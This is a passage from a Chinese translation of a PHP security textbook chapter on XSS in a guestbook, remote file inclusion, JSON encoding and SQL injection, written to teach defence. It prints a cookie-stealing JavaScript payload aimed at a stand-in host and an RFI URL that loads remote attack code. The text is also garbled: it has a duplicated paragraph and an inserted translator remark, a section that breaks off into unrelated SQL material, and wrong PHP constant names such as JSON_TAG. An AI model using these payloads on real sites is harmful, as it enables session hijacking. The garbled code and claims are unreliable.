  \ Scripting）。这个缩写是 XSS，但 CSS 已经被层叠样式表（Cascading Style Sheets）占据了。XSS 的效果是脚本被注入到网站中。为了说明这一点，想象一个简单的留言板，正如我们在示例中看到那里。\n\
  \n（注：由于原文文本中存在大量重复段落和翻译翻译，翻译员已提取了核心翻译逻辑。）\n\nXSS 的效果是脚本被注入到网站中。为了说明这一点，想象一个简单的留言板，正如我们在示例中看到那里。\n\
  \n## 32.3 输出过滤\n\n只有留言板的输出是有问题的，正如下一个列表所示。\n\n```html\n<html\n<head>\n  <title>Guestbook</title>\n\
  </head>\n<body \n```\n\n\n\n\n```php\n<?php\n  try {\n    $db = new SQLite3(\"guestbook.db\"\
  ); \n    $result = $db->query( \n                 \"SELECT * FROM entries\");\n\
  \    while ($row = $result->fetchArray()) {\n      echo $row[\"entry\"] . \"<hr\
  \ />\";\n    }\n    $db->close();\n  } catch (Exception $ex) {\n  }\n?>\n```\n\n\
  ```html\n</body>\n</html>  \n```\n\n## 列表 32.3 (错误) 条目输出 (\"gb-show.php\")\n\n你看到错误了吗？如果你输入几条无害的条目然后读取它们，并没有问题。但如果你输入了\
  \ HTML 代码会发生什么？这些代码将未经过滤地直接输出。因此，你可以破坏留言板的布局——例如，通过包含攻击性的图片。图 32.2 和 图 32.3 显示了一个更无害的变体——即在留言板条目中使用\
  \ `<hr />` 和其他 HTML 标签。\n\n![已输入了一个（无害的）条目](img/img-f32.2.html) \n\n**图 32.2** 已输入了一个（无害的）条目\n\
  \n![HTML 代码未经过滤地输出](img/img-f32.3.html) \n\n**图 32.3** HTML 代码未经过滤地输出\n\n光是这样就已经够糟糕了，但当注入\
  \ JavaScript 代码而不是 HTML 代码时，情况会更糟糕[[ 144 ]](footnotes.html#ftn-fn32_01)。存在存在不同程度的残忍：\n\
  \n*   使用 `window.alert()` 打开模态警告窗口\n*   使用 `window.reload()` 让页面无限刷新\n*   使用 `location.href\
  \ = \"http://andererserver.xy\"` 对用户重定向\n*   读取所有 cookie（未受保护的 cookie，将在本章稍后解释）——例如，使用\
  \ `location.href = \"http://otherserver.xy/cookietheft.php?c=\" + escape(document.cookie)`\n\
  \n出于某些原因，这里不再详细解释，但图 32.4 显示了第一种攻击方法的效果。\n\n![警告窗口从哪里来？](img/img-f32.4.html) \n\n\
  **图 32.4** 警告窗口从哪里来？\n\n思考一下 cookie 中可能存储什么：例如，当前的会话 ID。这使得接管受害者的会话变得容易（这被称为会话劫持）。\n\
  \n所以你可以看到，数据在写入数据库时或读取时都必须经过过滤。这可以使用 `htmlspecialchars()` 函数来实现，它能可靠地将所有角括号（以及其他“坏”字符：单引号、双引号和\
  \ ampersand）转换为相应的 HTML 实体：\n\n```php\n$coded = htmlspecialchars($input);  \n```\n\
  \n所有来自客户端的（因此可能是恶意的）内容必须在输出前进行保存。除了 `$_GET`、`$_POST` 和 `$_COOKIE` 之外，还包括 `$_SERVER`\
  \ 中的某些项，包括 `$_SERVER[\"PHP_SELF\"]`。\n\n### 注意\n\n为了防止会话劫持和 cookie 盗窃，使用 `HttpOnly`\
  \ 标志防止 JavaScript 访问会话 cookie 也有帮助：\n\n```js\nsession.cookie_httponly = \"On\" \n\
  ```\n\n因此 XSS 极其容易被利用，但即使是专业杂志的网站过去也曾证明存在漏洞。最重要的是，这种情况发生在那些 HTML 经验较少、看不出 Web 开发与桌面应用开发之间区别的人身上。\n\
  \n最后，是一个关于未检查用户数据的警示示例。假设你开发了（另一个）内容管理系统，并且具有以下类型的 URL：\n\n*   `http://server/index.php?section=index`\n\
  *   `http://server/index.php?section=products`\n*   `http://server/index.php?section=support`\n\
  *   `http://server/index.php?section=imprint`\n\n在每个页面上都可以找到以下代码：\n\n```php \n \
  \ $section = (isset($_GET[\"section\"])) ? $_GET[\"section\"] : \"index\"; \n  include\
  \ \"$section.php\"; \n?>  \n```\n\n看起来不错，对吧？例如，当调用 `index.php?section=products`\
  \ 时，将包含 `products.php` 文件。但调用以下内容会发生什么？\n\n`http://server/index.php?sektion=http://www.xy.zzz/attack`\n\
  \n此时将包含 `http://www.xy.zzz/attack.php` URL（假设有相应的 PHP 配置；`allow_url_include` 必须设置为\
  \ `On`，但幸运的是它默认是 `Off` 并且从 PHP 7.4.0 开始被弃用，因此它将在某时刻移除）。你已成功地向第三方网站注入了 PHP 代码。很可怕，不是吗？\n\
  \n### 与 XSS 之争中的希望\n\nXSS 是一种可怕的攻击，自 2003 年以来一直位列 OWASP 前 10 第三。尽管它在 2017 年掉到了第七，但在\
  \ 2021 年，XSS 结合 SQL 注入又回到了第三。\n\n但 XSS 的终结应该不远。通过内容安全策略（CSP），你可以在 [`w3.org/CSP`](https://w3.org/CSP)\
  \ 找到更多信息。基本上，这涉及到通过 HTTP 头部来告诉浏览器如何处理内容。\n\n### JSON 注入\n\n在使用 JSON 时需要特殊的预防措施。假设你有一个端点通过\
  \ `json_encode()` 序列化数据并直接输出它。在这里理论上可能发生跨站脚本攻击！如果你输出的数据部分来自用户，你必须按照以下模式进行编码：\n\n\
  ```php\necho json_encode($data, JSON_TAG | JSON_APOS | JSON_QUOT | JSON_AMP);\n\
  ```\n\n这五个特殊字符被转换为十六进制值，因此在浏览器中是无害的。\n\n\n\n\n\n这是一种初步方法，但 SQL 中还有其他特殊字符，例如下划线或百分比符号（都用于\
  \ `WHERE` 子句）。因此，必须采取特殊措施。对于 MySQL，`magic_quotes` 曾也用于此类操作。SQL 注入是创建这一不受欢迎（且最近已废弃）的\
  \ `magic quotes` 功能的主要原因之一。MySQL 可以通过反斜杠转义特殊字符，但这并不是 SQL 标准的一部分。因此，其他数据库不按照预期解释这些字符并不令人意外。但不要绝望：某些数据库模块提供了额外的函数（在\
  \ OOP API 的情况下为方法）来相应地准备用户输入。表 32.1 显示了部分示例。\n\n| 模块 | 函数 |\n| --- | --- |\n| MySQL\
  \ | `mysqli_real_escape_string()`/`MySQLi::real_escape_string()` |\n| SQLite | `SQLite3::escapeString()`\
  \ |\n| MSSQL | - |\n| PostgreSQL | `pg_escape_string()` |\n| Oracle | - |\n\n**表\
  \ 32.1** 转义特殊字符的函数\n\n正如你所看到的，某些数据库系统的状况看起来相当糟糕——但幸运的是，这些系统提供了预处理语句作为一种安全的方法。下面的列表显示了一个使用\
  \ PHP 的 `mysqli` 扩展在 MySQL 中的示例。\n\n```php\n<?php\n  $entry = $_POST[\"entry\"]\
  \ ?? \"\";\n\n  if ($db = mysqli_connect(\"server\", \"user\", \"password\",\n \
  \     \"guestbook\")) {\n    if ($stmt = mysqli_prepare($db, \n      \"INSERT INTO\
  \ entries (entry) VALUES (?)\")) {\n      mysqli_stmt_bind_param($stmt, \"s\", $entry);\n\
  \      mysqli_stmt_execute($stmt);\n      mysqli_stmt_close($stmt);\n    } \n  \
  \  mysqli_close($db);\n  }\n?> \n```\n\n```html\n<html\n<head>\n  <title>Guestbook</title>\n\
  </head>\n<body \n<form method=\"post\" action=\"\">\n  Comment: <textarea name=\"\
  entry\" cols=\"\" rows=\"\"></textarea><br />\n  <input type=\"submit\" value=\"\
  Enter\" />\n</form>\n</body>\n</html>\n```\n\n****列表 32.4** 一个更好的输入脚本 (\"gb-enter-2.php\"\
  )\n\nSQL 注入是非常危险的，因为它会对 Web 服务器造成严重损害。因此，在处理用户输入的每一个数据库查询中都要务必小心。即使是专业杂志，也经常包含不过滤外部数据的代码，因此容易受到\
  \ SQL 注入的影响。你可以自己在你自己的网站上安全地测试这一点。如果你有页面通过 URL 传输数据（例如，`news.php?id=123`），请插入单引号（`news.php?id='123`）。如果你收到了\
  \ PHP 错误消息，则存在两个潜在的危险点：\n\n1. 页面没有过滤或验证用户输入。\n2. 页面将 PHP 消息输出给客户端，从而免费为攻击者提供了有价值的信息。\n\
  \n## 32.4 隐藏字段\n\n在恶意输入数据方面，还有另一个棘手但又简单易举的选项。为了说明这一点，我们首先展示另一个示例。在章节开头，我们那个构建得糟糕的\
